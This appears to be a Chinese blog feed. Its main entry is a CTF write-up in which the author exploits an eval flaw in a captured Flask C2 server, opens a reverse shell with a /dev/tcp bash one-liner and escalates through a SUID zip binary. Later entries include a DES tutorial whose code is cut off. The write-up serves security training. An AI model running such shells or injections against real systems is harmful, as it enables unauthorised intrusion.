        <content type="html"><![CDATA[<blockquote><p>本来在CTF中应该都是基操，但是因为本人太菜，弄了好几天才出。。。（T0T）</p></blockquote><p>题目</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402165312088.png" alt="image-20240402165312088"></p><p>先是流量分析，看到了很多TCP和HTTP流，追踪大概看一下</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402164740735.png" alt="image-20240402164740735"></p><p>看起来传输了很多加密的信息，先把它们全都手动整理出来</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402164916818.png" alt="image-20240402164916818"></p><p>直接解base64解不出，但是POST传参时看到了一个random_key，猜是异或用的，果然</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402165223751.png" alt="image-20240402165223751"></p><p>看到用curl从攻击机读取了一个文件，我也试着读了一下，发现可以从攻击机中读到任意文件，于是读到了第一个flag</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402165620146.png" alt="image-20240402165620146"></p><p>从读一些不存在的文件产生的报错中可以看到python flask源码，读下来进行审计</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402165819762.png" alt="image-20240402165819762"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, send_file</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">clients = &#123;<span class="string">&quot;4ace608657cba629&quot;</span>: &#123;<span class="string">&quot;command&quot;</span>: <span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;random_key&quot;</span>: <span class="number">95</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/init&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    client_id = secrets.token_hex(<span class="number">8</span>)</span><br><span class="line">    random_key = secrets.randbelow(<span class="number">255</span>)</span><br><span class="line">    clients[client_id] = &#123;<span class="string">&quot;command&quot;</span>: <span class="string">&quot;echo hello&quot;</span>, <span class="string">&quot;random_key&quot;</span>: random_key&#125;</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;client_id&quot;</span>: client_id, <span class="string">&quot;random_key&quot;</span>: random_key&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/recv&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_command</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    client_id = data[<span class="string">&quot;client_id&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(client_id, data[<span class="string">&quot;random_key&quot;</span>])</span><br><span class="line">    command = clients[client_id].get(<span class="string">&quot;command&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    encrypted_command = encrypt_command(</span><br><span class="line">        command, clients[client_id][<span class="string">&quot;random_key&quot;</span>])</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;encrypted_command&quot;</span>: encrypted_command&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/send&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_data</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    client_id = data[<span class="string">&quot;client_id&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">eval</span>(data[<span class="string">&quot;random_key&quot;</span>]) != clients[client_id][<span class="string">&quot;random_key&quot;</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;data error&quot;</span>, <span class="number">200</span></span><br><span class="line">    encrypted_data = data[<span class="string">&quot;data&quot;</span>]</span><br><span class="line">    decrypted_data = decrypt_data(</span><br><span class="line">        encrypted_data, clients[client_id][<span class="string">&quot;random_key&quot;</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Received data: <span class="subst">&#123;decrypted_data.decode()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Received data&quot;</span>, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/files&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_file</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    client_id = data[<span class="string">&quot;client_id&quot;</span>]</span><br><span class="line">    random_key = data[<span class="string">&quot;random_key&quot;</span>]</span><br><span class="line">    path = data[<span class="string">&quot;path&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> client_id <span class="keyword">not</span> <span class="keyword">in</span> clients.keys():</span><br><span class="line">        <span class="keyword">return</span> jsonify(</span><br><span class="line">            &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid client_id&quot;</span>&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> clients[client_id][<span class="string">&quot;random_key&quot;</span>] == <span class="built_in">int</span>(random_key):</span><br><span class="line">        <span class="keyword">return</span> send_file(path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(</span><br><span class="line">            &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;incorrect random_key&quot;</span>&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_command</span>(<span class="params">command, key</span>):</span><br><span class="line">    encrypted_data = xor(command, key)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(encrypted_data).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_data</span>(<span class="params">encrypted_data, key</span>):</span><br><span class="line">    encrypted_data = base64.b64decode(encrypted_data)</span><br><span class="line">    <span class="keyword">return</span> xor(encrypted_data, key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_flask_app</span>():</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, debug=<span class="literal">True</span>, port=<span class="number">1337</span>, use_reloader=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flask_thread = Thread(target=run_flask_app)</span><br><span class="line">    flask_thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        command = <span class="built_in">input</span>(<span class="string">&quot;Enter command: &quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> client_id <span class="keyword">in</span> clients.keys():</span><br><span class="line">            clients[client_id][<span class="string">&quot;command&quot;</span>] = command</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Executing: <span class="subst">&#123;command&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>可以看到在判断random_key是否正确的地方存在一个我们CTFer最喜欢的eval，于是可以通过这个漏洞执行RCE</p><p>反弹shell拿下C2服务器</p><p>给攻击机传bash -c “bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1”</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2024-04-02-170509.png" alt="屏幕截图 2024-04-02 170509"></p><p>自己的服务器监听2333端口</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402170726047.png" alt="image-20240402170726047"></p><p>ps aux查看一下运行的程序</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402171043213.png" alt="image-20240402171043213"></p><p>可以看到C2服务器是用tmux运行的，那么用tmux回到这个会话（后来开放了ssh，用ssh连，先把自己的公钥配置进去，这里不再赘述）</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402180037287.png" alt="image-20240402180037287"></p><p>有点问题，那么就先把前面的tmux进程kill了再启动，根据它给的id和key改一下server.py，kill了再启动</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402180438620.png" alt="image-20240402180438620"></p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402180615128.png" alt="image-20240402180615128"></p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402180708976.png" alt="image-20240402180708976"></p><p>输指令反弹shell</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2024-04-02-180909.png" alt="屏幕截图 2024-04-02 180909"></p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402181031310.png" alt="image-20240402181031310"></p><p>可以看到现在的用户是ctf，但是flag在&#x2F;root&#x2F;flag.txt下，需要提权</p><p>这里用suid提权，先看一下哪些文件有suid权限</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402181207616.png" alt="image-20240402181207616"></p><p>在<a href="https://gtfobins.github.io/gtfobins/zip/">gtfobins</a>上面查到可以利用&#x2F;usr&#x2F;bin&#x2F;zip提权读取文件，以此得到第二个flag</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402181337524.png" alt="image-20240402181337524"></p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402181431988.png" alt="image-20240402181431988"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X1ct34m 2024 Misc 招新题 Wrong Direction!（需要密码）</title>
      <link href="/2024/03/28/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-Wrong-Direction!/"/>
      <url>/2024/03/28/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-Wrong-Direction!/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Sorry, wrong password, try again." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="344e71637c6267b62634dd06fcbe84613e0037f70043c9e300b2c2370bd805c9"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Plz enter the password.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NKCTF2024 Writeup</title>
      <link href="/2024/03/24/NKCTF2024-Writeup/"/>
      <url>/2024/03/24/NKCTF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/NKCTF2024Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> NKCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DES加密原理</title>
      <link href="/2024/03/20/DES%E5%8A%A0%E5%AF%86/"/>
      <url>/2024/03/20/DES%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>参考了<a href="https://blog.csdn.net/weixin_52553215/article/details/124215865">这篇文章</a></p><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>DES（Data Encryption  Standard）是一种对称加密算法，它将64位的明文分成64位的块，并使用64位的密钥来进行加密操作。虽然DES本身只能处理64位的数据块，但是可以通过分组密码模式（如ECB、CBC、CFB、OFB、CTR等）来加密更长的数据。</p><h2 id="初始置换"><a href="#初始置换" class="headerlink" title="初始置换"></a>初始置换</h2><p>输入明文M（64位），根据下表进行初始置换，得到IP</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">58,50,42,34,26,18,10,2,</span><br><span class="line">60,52,44,36,28,20,12,4,</span><br><span class="line">62,54,46,38,30,22,14,6,</span><br><span class="line">64,56,48,40,32,24,16,8,</span><br><span class="line">57,49,41,33,25,17, 9,1,</span><br><span class="line">59,51,43,35,27,19,11,3,</span><br><span class="line">61,53,45,37,29,21,13,5,</span><br><span class="line">63,55,47,39,31,23,15,7,</span><br></pre></td></tr></table></figure><p>如将M的第58位填入IP的第一位。</p><p>然后将IP平分为两段，L0和R0</p><h2 id="生成子密钥"><a href="#生成子密钥" class="headerlink" title="生成子密钥"></a>生成子密钥</h2><p>一图以概之</p><img src="/images/DES加密/4433f1aedb9f4df98c7cbb7a783a7bda.png" alt="4433f1aedb9f4df98c7cbb7a783a7bda" style="zoom: 80%;" /><p>首先，一开始输入的64位key按照下表进行转换，生成56位密钥（置换选择1）</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">57,49,41,33,25,17,9,1,</span><br><span class="line">58,50,42,34,26,18,10,2,</span><br><span class="line">59,51,43,35,27,19,11,3,</span><br><span class="line">60,52,44,36,63,55,47,39,</span><br><span class="line">31,23,15,7,62,54,46,38,</span><br><span class="line">30,22,14,6,61,53,45,37,</span><br><span class="line">29,21,13,5,28,20,12,4</span><br></pre></td></tr></table></figure><p>实际上，这里只从原始密钥中取了56位进行变换，原始密钥中每字节的最高位是没有被使用的。</p><p>得到子密钥（56位）后，将变换后的子密钥分成两部分，C0和D0</p><p>得到C0和D0后，分别进行循环左移位操作，得到C1<del>C16和D1</del>D16的值，每一次循环移位的位数如下：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1</span><br></pre></td></tr></table></figure><p>如C0&#x3D;1111000011001100101010101111</p><p>C1&#x3D;1110000110011001010101011111</p><p>C2&#x3D;1100001100110010101010111111</p><p>将每组Cn和Dn组合起来，得到十六组数据再次按照下表进行替换，得到K1~K16（置换选择2）</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">14,17,11,24,1,5,</span><br><span class="line">3,28,15,6,21,10,</span><br><span class="line">23,19,12,4,26,8,</span><br><span class="line">16,7,27,20,13,2,</span><br><span class="line">41,52,31,37,47,55,</span><br><span class="line">30,40,51,45,33,48,</span><br><span class="line">44,49,39,56,34,53,</span><br><span class="line">46,42,50,36,29,32</span><br></pre></td></tr></table></figure><h2 id="轮函数"><a href="#轮函数" class="headerlink" title="轮函数"></a>轮函数</h2><p>对上面初始置换中得到的L0和R0，我们在这里进行16轮加密变换，下面的图<del>（嫖来的）</del>描述了这个流程，其中函数f后面会叙述</p><p><img src="/images/DES%E5%8A%A0%E5%AF%86/2e1e54d0330a4d21a4aeada39bd0ca72.png" alt="2e1e54d0330a4d21a4aeada39bd0ca72"></p><p>由图知，L0通过与f函数运算后的结果进行异或后成为了R1，R0直接用作L1</p><p>下面是对f函数实现过程的具体描述</p><p><img src="/images/DES%E5%8A%A0%E5%AF%86/01d6b86ae2844e53b304002dc3c36db2.png" alt="01d6b86ae2844e53b304002dc3c36db2"></p><h3 id="扩充-置换："><a href="#扩充-置换：" class="headerlink" title="扩充&#x2F;置换："></a>扩充&#x2F;置换：</h3><p>此处的32位Rn先进行扩充置换变成了48位（因为我们需要将其与48位的子密钥异或）。</p><h3 id="与密钥异或"><a href="#与密钥异或" class="headerlink" title="与密钥异或"></a>与密钥异或</h3><p>在扩充后，与之前生成的对应轮数的子密钥Kn进行异或运算</p><h3 id="代换-选择"><a href="#代换-选择" class="headerlink" title="代换&#x2F;选择"></a>代换&#x2F;选择</h3><p>将48位的数据转换为32位。这一步是整个DES算法的核心，简称S盒。</p><h4 id="S盒"><a href="#S盒" class="headerlink" title="S盒"></a>S盒</h4><p><img src="/images/DES%E5%8A%A0%E5%AF%86/e6cccba809c648ad96d79f2119b1d083.png" alt="e6cccba809c648ad96d79f2119b1d083"></p><p>对于每个S盒，对照着4行16列的表，6比特输入中的第1比特和第6比特组成的二进制数来确定行，中间4位二进制数来确定列，对应行、列位置的十进制数的4位二进制数表示作为输出。</p><h3 id="置换"><a href="#置换" class="headerlink" title="置换"></a>置换</h3><p>经过置换表进行置换</p><h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>与对应环节的Ln进行异或</p><h2 id="交换"><a href="#交换" class="headerlink" title="交换"></a>交换</h2><p>将L16和R16位置交换</p><h2 id="逆初始置换"><a href="#逆初始置换" class="headerlink" title="逆初始置换"></a>逆初始置换</h2><p><strong>这里的置换方式与前面的不一样！</strong></p><p>这里的方式与前面的都恰好相反。</p><p>例如：</p><p>原始数据的第1位置换到了第40位，第2位置换到了第8位。则逆置换就是将第40位置换到第1位，第8位置换到第2位。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">40,8,48,16,56,24,64,32,</span><br><span class="line">39,7,47,15,55,23,63,31,</span><br><span class="line">38,6,46,14,54,22,62,30,</span><br><span class="line">37,5,45,13,53,21,61,29,</span><br><span class="line">36,4,44,12,52,20,60,28,</span><br><span class="line">35,3,43,11,51,19,59,27,</span><br><span class="line">34,2,42,10,50,18,58,26,</span><br><span class="line">33,1,41,9,49,17,57,25</span><br></pre></td></tr></table></figure><p>至此可以得到密文C</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>参考了<a href="https://blog.csdn.net/weixin_44034444/article/details/121055630">这篇文章</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ArrangeSimpleDES</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title 